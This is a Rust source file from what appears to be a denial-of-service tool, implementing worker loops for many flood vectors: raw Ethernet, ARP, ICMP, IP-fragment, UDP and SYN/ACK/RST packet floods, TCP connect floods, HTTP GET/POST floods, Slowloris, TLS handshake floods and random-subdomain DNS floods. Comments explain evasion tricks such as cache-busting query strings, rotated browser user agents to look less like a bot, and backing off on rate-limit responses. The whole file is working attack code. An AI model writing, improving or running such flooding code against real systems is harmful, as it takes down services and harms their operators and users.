//! Attack workers for every vector.

use std::net::{Ipv4Addr, SocketAddr};
use std::sync::atomic::{AtomicI64, Ordering};
use std::sync::Arc;
use std::time::Duration;

use rand::{Rng, SeedableRng};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::{TcpStream, UdpSocket};

use crate::net::raw::{self, Iface, RawSock};
use crate::stats::Stats;
use crate::target::Target;
use crate::vectors::Vector;

pub struct Ctx {
    pub target: Target,
    pub port: u16,
    pub iface: Option<Iface>,
    pub raw: Option<Arc<RawSock>>,
    pub stats: Arc<Stats>,
    pub cookie: Option<String>,
    pub budgets: Vec<Arc<Budget>>,
}

const UA_POOL: [&str; 6] = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
];

/// Per-vector packet budget so one raw flood cannot starve the others or the
/// L7 vectors. SYN floods are capped lowest because every SYN-ACK comes back
/// and forces the kernel to emit a RST.
pub fn raw_rate(v: Vector) -> i64 {
    match v {
        Vector::SynFlood => 2_000,
        Vector::AckFlood | Vector::RstFlood => 6_000,
        Vector::UdpRaw => 15_000,
        Vector::IcmpFlood => 8_000,
        _ => 8_000,
    }
}

/// Shared packet budget so raw floods leave headroom for the L7 vectors.
/// Without it the raw loops saturate the interface and starve TCP/TLS/HTTP.
pub struct Budget {
    tokens: AtomicI64,
    rate: i64,
}

impl Budget {
    pub fn new(pps: i64) -> Self {
        Self {
            tokens: AtomicI64::new(pps / 100),
            rate: pps,
        }
    }

    fn refill(&self, dt_ms: i64) {
        let add = (self.rate * dt_ms / 1000).max(1);
        let cap = (self.rate / 10).max(1) * 2;
        let mut cur = self.tokens.load(Ordering::Relaxed);
        loop {
            let next = (cur + add).min(cap);
            match self
                .tokens
                .compare_exchange_weak(cur, next, Ordering::Relaxed, Ordering::Relaxed)
            {
                Ok(_) => return,
                Err(c) => cur = c,
            }
        }
    }

    fn take(&self, n: i64) -> bool {
        let mut cur = self.tokens.load(Ordering::Relaxed);
        loop {
            if cur < n {
                return false;
            }
            match self
                .tokens
                .compare_exchange_weak(cur, cur - n, Ordering::Relaxed, Ordering::Relaxed)
            {
                Ok(_) => return true,
                Err(c) => cur = c,
            }
        }
    }
}

pub fn spawn_refill(budgets: Vec<Arc<Budget>>, stats: Arc<Stats>) {
    tokio::spawn(async move {
        let mut last = std::time::Instant::now();
        while stats.running() {
            tokio::time::sleep(Duration::from_millis(10)).await;
            let now = std::time::Instant::now();
            let dt = now.duration_since(last).as_millis() as i64;
            last = now;
            if dt <= 0 {
                continue;
            }
            for b in &budgets {
                b.refill(dt);
            }
        }
    });
}

fn workers(v: Vector) -> usize {
    match v {
        Vector::EthFlood | Vector::ArpFlood | Vector::IcmpFlood | Vector::IpFrag => 1,
        Vector::SynFlood | Vector::AckFlood | Vector::RstFlood | Vector::UdpRaw => 1,
        Vector::UdpFlood => 4,
        Vector::TcpConnect => 256,
        Vector::HttpGet | Vector::HttpPost => 128,
        Vector::TlsFlood => 64,
        Vector::DnsFlood => 32,
        Vector::Slowloris => 200,
    }
}

pub fn launch(ctx: Arc<Ctx>, vectors: Vec<Vector>) {
    for v in vectors {
        let idx = v.index();
        let n = workers(v);
        for _ in 0..n {
            let c = ctx.clone();
            if v.needs_raw() {
                std::thread::spawn(move || raw_worker(c, v, idx));
            } else {
                tokio::spawn(async move { async_worker(c, v, idx).await });
            }
        }
    }
}

// ------------------------------------------------------------------ raw

const BATCH: usize = 24;

fn raw_worker(ctx: Arc<Ctx>, v: Vector, idx: usize) {
    let (Some(iface), Some(sock)) = (ctx.iface.as_ref(), ctx.raw.as_ref()) else {
        return;
    };
    let dst = match ctx.target.primary() {
        Some(ip) => ip,
        None => return,
    };
    let hop = iface.next_hop_mac();
    let mut rng = rand::thread_rng();
    let mut frames: Vec<Vec<u8>> = Vec::with_capacity(BATCH + 2);

    while ctx.stats.running() {
        frames.clear();
        for _ in 0..BATCH {
            match v {
                Vector::EthFlood => {
                    let mut f = raw::eth_header(raw::BROADCAST_MAC, iface.mac, 0x88b5);
                    let len = rng.gen_range(46..1500);
                    let mut body = vec![0u8; len];
                    rng.fill(&mut body[..]);
                    f.extend_from_slice(&body);
                    frames.push(f);
                }
                Vector::ArpFlood => {
                    let gw = iface.gw_ip.unwrap_or(dst);
                    let probe: Ipv4Addr = Ipv4Addr::from(rng.gen::<u32>());
                    let target = if probe.is_unspecified() { gw } else { probe };
                    frames.push(raw::arp_request(iface.mac, iface.ip, target));
                }
                Vector::IcmpFlood => {
                    let mut payload = [0u8; 32];
                    rng.fill(&mut payload);
                    frames.push(raw::icmp_frame(
                        iface,
                        hop,
                        iface.ip,
                        dst,
                        raw::rand_u16(),
                        raw::rand_u16(),
                        &payload,
                    ));
                }
                Vector::IpFrag => {
                    let [a, b] = raw::frag_frames(
                        iface,
                        hop,
                        iface.ip,
                        dst,
                        raw::rand_port(),
                        ctx.port,
                    );
                    frames.push(a);
                    frames.push(b);
                }
                Vector::UdpRaw => {
                    let mut payload = [0u8; 24];
                    rng.fill(&mut payload);
                    frames.push(raw::udp_frame(
                        iface,
                        hop,
                        iface.ip,
                        dst,
                        raw::rand_port(),
                        ctx.port,
                        &payload,
                    ));
                }
                Vector::SynFlood | Vector::AckFlood | Vector::RstFlood => {
                    let flags = match v {
                        Vector::SynFlood => 0x02,
                        Vector::AckFlood => 0x10,
                        _ => 0x04,
                    };
                    frames.push(raw::tcp_frame(
                        iface,
                        hop,
                        iface.ip,
                        dst,
                        raw::rand_port(),
                        ctx.port,
                        raw::rand_u32(),
                        if v == Vector::AckFlood { raw::rand_u32() } else { 0 },
                        flags,
                        &[],
                    ));
                }
                _ => break,
            }
        }
        if !ctx.budgets[idx].take(frames.len() as i64) {
            std::thread::sleep(Duration::from_millis(1));
            continue;
        }
        match sock.send_batch(&frames) {
            Ok(n) => {
                for f in frames.iter().take(n) {
                    ctx.stats.hit(idx, f.len());
                }
                if n < frames.len() {
                    ctx.stats.error();
                }
            }
            Err(_) => ctx.stats.error(),
        }
    }
}

// ------------------------------------------------------------------ async

async fn async_worker(ctx: Arc<Ctx>, v: Vector, idx: usize) {
    let Some(dst) = ctx.target.primary() else {
        return;
    };
    let addr = SocketAddr::from((dst, ctx.port));
    let host = ctx.target.host.clone();

    match v {
        Vector::TcpConnect => {
            while ctx.stats.running() {
                match TcpStream::connect(addr).await {
                    Ok(_s) => ctx.stats.hit(idx, 0),
                    Err(_) => ctx.stats.error(),
                }
            }
        }
        Vector::UdpFlood => {
            let Ok(sock) = UdpSocket::bind("0.0.0.0:0").await else {
                return;
            };
            let mut rng = rand::rngs::StdRng::from_entropy();
            let mut buf = [0u8; 1200];
            while ctx.stats.running() {
                rng.fill(&mut buf[..]);
                match sock.send_to(&buf, addr).await {
                    Ok(n) => ctx.stats.hit(idx, n),
                    Err(_) => ctx.stats.error(),
                }
            }
        }
        Vector::HttpGet | Vector::HttpPost => {
            let mut rng = rand::rngs::StdRng::from_entropy();
            let cookie = ctx.cookie.clone();
            while ctx.stats.running() {
                let Ok(mut s) = TcpStream::connect(addr).await else {
                    ctx.stats.error();
                    continue;
                };
                // Random query string defeats edge caching; random UA and
                // no-cache headers make the request look less like a bot.
                let path = format!("/?{}={}", rng.gen::<u32>(), rng.gen::<u64>());
                let ua = UA_POOL[rng.gen_range(0..UA_POOL.len())];
                let body = if v == Vector::HttpPost {
                    "x".repeat(rng.gen_range(64..512))
                } else {
                    String::new()
                };
                let mut req = format!(
                    "{} {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {ua}\r\nAccept: */*\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: no-cache\r\nPragma: no-cache\r\n",
                    if v == Vector::HttpPost { "POST" } else { "GET" }
                );
                if v == Vector::HttpPost {
                    req.push_str(&format!(
                        "Content-Type: application/x-www-form-urlencoded\r\nContent-Length: {}\r\n",
                        body.len()
                    ));
                }
                if let Some(c) = &cookie {
                    req.push_str(&format!("Cookie: {c}\r\n"));
                }
                req.push_str("Connection: close\r\n\r\n");
                req.push_str(&body);

                let n = req.len();
                if s.write_all(req.as_bytes()).await.is_err() {
                    ctx.stats.error();
                    continue;
                }
                ctx.stats.hit(idx, n);

                // Read just the status line so rate limiting can be detected.
                let mut head = [0u8; 32];
                let status = match tokio::time::timeout(
                    Duration::from_millis(250),
                    s.read(&mut head),
                )
                .await
                {
                    Ok(Ok(k)) if k > 0 => parse_status(&head[..k]),
                    _ => 0,
                };
                if matches!(status, 429 | 403 | 503) {
                    tokio::time::sleep(Duration::from_millis(rng.gen_range(40..160))).await;
                }
                drop(s);
            }
        }
        Vector::Slowloris => {
            while ctx.stats.running() {
                let Ok(mut s) = TcpStream::connect(addr).await else {
                    ctx.stats.error();
                    continue;
                };
                let head = format!(
                    "GET / HTTP/1.1\r\nHost: {host}\r\nUser-Agent: RustDoS\r\nX-Pad: {}\r\n",
                    "a".repeat(64)
                );
                if s.write_all(head.as_bytes()).await.is_err() {
                    ctx.stats.error();
                    continue;
                }
                ctx.stats.hit(idx, head.len());
                // Dribble header lines to keep the socket alive.
                for _ in 0..6 {
                    if !ctx.stats.running() {
                        break;
                    }
                    tokio::time::sleep(Duration::from_millis(1200)).await;
                    let line = format!("X-Keep: {}\r\n", "b".repeat(16));
                    if s.write_all(line.as_bytes()).await.is_err() {
                        break;
                    }
                    ctx.stats.hit(idx, line.len());
                }
            }
        }
        Vector::TlsFlood => {
            let Some(cfg) = crate::tls::config() else {
                return;
            };
            let server = host.clone();
            while ctx.stats.running() {
                let Ok(tcp) = TcpStream::connect(addr).await else {
                    ctx.stats.error();
                    continue;
                };
                let connector = tokio_rustls::TlsConnector::from(cfg.clone());
                let name = match rustls::pki_types::ServerName::try_from(server.clone()) {
                    Ok(n) => n,
                    Err(_) => return,
                };
                match tokio::time::timeout(
                    Duration::from_secs(3),
                    connector.connect(name, tcp),
                )
                .await
                {
                    Ok(Ok(_)) => ctx.stats.hit(idx, 517),
                    _ => ctx.stats.error(),
                }
            }
        }
        Vector::DnsFlood => {
            let Ok(sock) = UdpSocket::bind("0.0.0.0:0").await else {
                return;
            };
            let base = host.clone();
            let mut rng = rand::rngs::StdRng::from_entropy();
            while ctx.stats.running() {
                let label: String = (0..rng.gen_range(6..14))
                    .map(|_| (b'a' + rng.gen_range(0..26)) as char)
                    .collect();
                let q = dns_query(&format!("{label}.{base}"));
                match sock.send_to(&q, addr).await {
                    Ok(n) => ctx.stats.hit(idx, n),
                    Err(_) => ctx.stats.error(),
                }
            }
        }
        _ => {}
    }
}

fn dns_query(name: &str) -> Vec<u8> {
    let mut v = Vec::with_capacity(64);
    v.extend_from_slice(&rand::random::<u16>().to_be_bytes());
    v.extend_from_slice(&[0x01, 0x00]); // RD
    v.extend_from_slice(&[0, 1, 0, 0, 0, 0, 0, 0]);
    for label in name.split('.').filter(|l| !l.is_empty()) {
        let l = &label.as_bytes()[..label.len().min(63)];
        v.push(l.len() as u8);
        v.extend_from_slice(l);
    }
    v.push(0);
    v.extend_from_slice(&[0, 1, 0, 1]); // A / IN
    v
}


fn parse_status(buf: &[u8]) -> u16 {
    let s = String::from_utf8_lossy(buf);
    s.split_whitespace()
        .nth(1)
        .and_then(|c| c.parse::<u16>().ok())
        .unwrap_or(0)
}
